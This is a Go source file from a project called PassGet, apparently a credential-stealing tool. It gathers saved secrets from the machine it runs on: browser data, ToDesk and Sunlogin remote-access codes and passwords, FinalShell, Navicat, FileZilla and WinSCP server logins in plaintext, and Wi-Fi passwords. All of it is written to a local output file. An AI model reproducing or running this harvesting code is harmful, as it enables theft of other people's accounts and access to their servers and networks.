package run

import (
	"PassGet/modules/browser"
	"PassGet/modules/filezilla"
	"PassGet/modules/finalshell"
	"PassGet/modules/navicat"
	"PassGet/modules/sunlogin"
	"PassGet/modules/todesk"
	"PassGet/modules/utils"
	browser2 "PassGet/modules/utils/browser"
	"PassGet/modules/wifi"
	"PassGet/modules/winscp"
	"fmt"
	"log"
)

func GetBrowser() error {
	if err := browser.Get(); err != nil {
		log.Printf("get browser data error %v", err)
		return err
	}
	return nil
}
func GetTodesk() {
	if Client := todesk.Get(); Client != nil {
		content := fmt.Sprintf("******************todesk******************\nCode:%s\nPass:%s\nInstallPath:%s\nProcName:%s\nProcId:%s\n************************************************************\n", Client.ID, Client.Pass, Client.InstallPath, Client.ProcName, Client.ProcId)
		e := utils.OutPutToFile(content, browser2.OutputDir)
		if e != nil {
			log.Printf("get todesk data error %v", e)
		}
	}
}
func GetSunlogin() {
	if Client := sunlogin.Get(); Client != nil {
		content := fmt.Sprintf("******************sunlogin******************\nCode:%s\nPass:%s\nInstallPath:%s\nProcName:%s\nProcId:%s\n************************************************************\n", Client.ID, Client.Pass, Client.InstallPath, Client.ProcName, Client.ProcId)
		e := utils.OutPutToFile(content, browser2.OutputDir)
		if e != nil {
			log.Printf("get sunlogin data error %v", e)
		}
	}
}
func GetFinalShell() {
	if _, ServerDetails := finalshell.Get(""); ServerDetails != nil {
		content := fmt.Sprintf("******************finalshell******************\n")
		for _, Server := range ServerDetails {
			content += fmt.Sprintf("------------------\nHost:%s\nPort:%d\nUserName:%s\nPassword:%s\nConnectionType:%s\nDiscription:%s\n------------------\n", Server.Host, Server.Port, Server.UserName, Server.PasswordPlainText, Server.ConnType, Server.Description)
		}
		content += fmt.Sprintf("************************************************************\n")
		e := utils.OutPutToFile(content, browser2.OutputDir)
		if e != nil {
			log.Printf("get finalshell data error %v", e)
		}
	}
}
func GetNaviCat() {
	if ServerDetails, err := navicat.Get(); err == nil {
		content := fmt.Sprintf("******************navicat******************\n")
		for _, Server := range ServerDetails {
			content += fmt.Sprintf("------------------\nType:%s\nHost:%s\nPort:%s\nUserName:%s\nPassword:%s\nAuthSource:%s\nInitialDatabase:%s\n", Server.Type, Server.Host, Server.Port, Server.UserName, Server.PasswordPlainText, Server.AuthSource, Server.InitialDatabase)
		}
		content += fmt.Sprintf("************************************************************\n")
		e := utils.OutPutToFile(content, browser2.OutputDir)
		if e != nil {
			log.Printf("get navicat data error %v", e)
		}
	}
}
func GetFileZilla() {
	if Servers := filezilla.Get(); Servers != nil {
		content := fmt.Sprintf("******************FileZilla******************\n")
		for _, Server := range Servers {
			content += fmt.Sprintf("------------------\nHost:%s\nPort:%s\nUserName:%s\nPassword:%s\n", Server.Host, Server.Port, Server.User, Server.Password)
		}
		content += fmt.Sprintf("************************************************************\n")
		e := utils.OutPutToFile(content, browser2.OutputDir)
		if e != nil {
			log.Printf("get sunlogin data error %v", e)
		}
	}
}
func GetWiFi() {
	if Wifis := wifi.Get(); Wifis != nil {
		content := fmt.Sprintf("******************wifi******************\n")
		for _, Wifi := range Wifis {
			content += fmt.Sprintf("------------------\nSSID:%s\nPassword:%s\n", Wifi.SSID, Wifi.Password)
		}
		content += fmt.Sprintf("************************************************************\n")
		e := utils.OutPutToFile(content, browser2.OutputDir)
		if e != nil {
			log.Printf("get Wifi data error %v", e)
		}
	}
}
func GetWinSCP() {
	if Servers := winscp.Get(""); Servers != nil {
		content := fmt.Sprintf("******************winscp******************\n")
		for _, Server := range Servers {
			content += fmt.Sprintf("------------------\nName:%s\nHost:%s\nProt:%s\nUserName:%s\nPassword:%s\n", Server.HostName, Server.PortNumber, Server.UserName, Server.PasswordPlain, Server.Name)
		}
		content += fmt.Sprintf("************************************************************\n")
		e := utils.OutPutToFile(content, browser2.OutputDir)
		if e != nil {
			log.Printf("get Wifi data error %v", e)
		}
	}
}
